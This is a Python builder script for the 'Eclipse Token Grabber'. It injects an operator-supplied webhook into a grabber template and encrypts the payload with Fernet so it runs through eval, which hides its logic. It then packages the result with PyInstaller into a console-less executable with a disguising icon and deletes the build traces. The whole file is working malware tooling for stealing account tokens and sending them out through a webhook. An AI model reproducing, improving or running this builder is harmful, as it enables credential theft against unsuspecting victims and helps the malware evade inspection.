from argparse import ArgumentParser, Namespace
from os import path
from os import remove as delete_file
from subprocess import PIPE, run
from sys import platform as OS

from cryptography.fernet import Fernet

BANNER = '''
    ███████╗ ██████╗██╗     ██╗██████╗ ███████╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗
    ██╔════╝██╔════╝██║     ██║██╔══██╗██╔════╝██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
    █████╗  ██║     ██║     ██║██████╔╝███████╗█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
    ██╔══╝  ██║     ██║     ██║██╔═══╝ ╚════██║██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
    ███████╗╚██████╗███████╗██║██║     ███████║███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
    ╚══════╝ ╚═════╝╚══════╝╚═╝╚═╝     ╚══════╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
\n        Made By Dimitris Kalopisis & Yuliy Mitryashkin | Twitter: @DKalopisis & @JM1k1
'''

GRABBER_PATH = path.join("code", "eclipse-grabber.py")
ENC_KEY = Fernet.generate_key().decode()


def build(webhook: str, out_file: str, debug: bool):

    code_file = open(GRABBER_PATH, 'r')
    code = code_file.read()
    code_file.close()

    index = code.find("WEBHOOK")
    libs = code[0:index] + "\nimport cffi\nfrom cryptography.fernet import Fernet\n"
    content = code[index:-1].replace("{WEBHOOK}", str(webhook))

    encrypted_content = Fernet(ENC_KEY).encrypt(content.encode())
    eval_code = (
        f"\ncode = Fernet('{ENC_KEY}').decrypt({encrypted_content}).decode();"
        "eval(compile(code, '<string>', 'exec'))"
    )

    build_file = open(out_file + ".py", 'w')
    build_file.write(libs)
    build_file.write(eval_code)
    build_file.close()

    if OS == "linux" or OS == "linux2":  # Linux
        compile_command = ["wine", "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/"
                           + "Python/Python38-32/Scripts/pyinstaller.exe"]
    elif OS == "win32":  # Windows
        compile_command = ["venv/Scripts/pyinstaller.exe"]
    elif OS == "darwin":  # OSX
        compile_command = ["pyinstaller"]
    else:
        exit("\n[-] OS not supported\n")

    compile_command += [out_file + ".py", "--onefile", "--noconsole", "--hidden-import=_cffi_backend", f"--icon={path.join('img','exe_file.ico')}"]

    try:
        if debug:
            compile_command.remove("--noconsole")
            run(args=compile_command)
        else:
            command_result = run(args=compile_command, stdout=PIPE, stderr=PIPE)
            result = str(command_result.stderr).replace("b\"", "").replace(r'\n', '\n').replace(r'\r', '\r')

            if "completed successfully" not in result:
                raise Exception(result)  # result.splitlines()[-2]
    except Exception as error:
        exit(f"\n[-] Build Error: {error}")

    try:
        delete_file(out_file+".py")
        delete_file(out_file+".spec")
    except (FileNotFoundError, PermissionError):
        pass


def get_args() -> Namespace:

    parser = ArgumentParser(description='Eclipse Token Grabber Builder')
    parser.add_argument('-w', '--webhook', help='add your webhook url', default='', required=True)
    parser.add_argument('-o', '--outfile', help='name your executable', default='', required=True)
    parser.add_argument('-d', '--debug', help='enable debug mode', nargs='?', const=True, default=False)
    return parser.parse_args()


def main(args: Namespace):

    print(BANNER)
    print("[+] Encryption Key:", ENC_KEY)
    print("\n[+] Building Eclipse Token Grabber, please wait...")
    build(args.webhook, args.outfile, args.debug)
    print("\n[+] Successfully Built!",
          "\n\n[+] You can find it inside the dist directory")


if __name__ == "__main__":
    main(get_args())
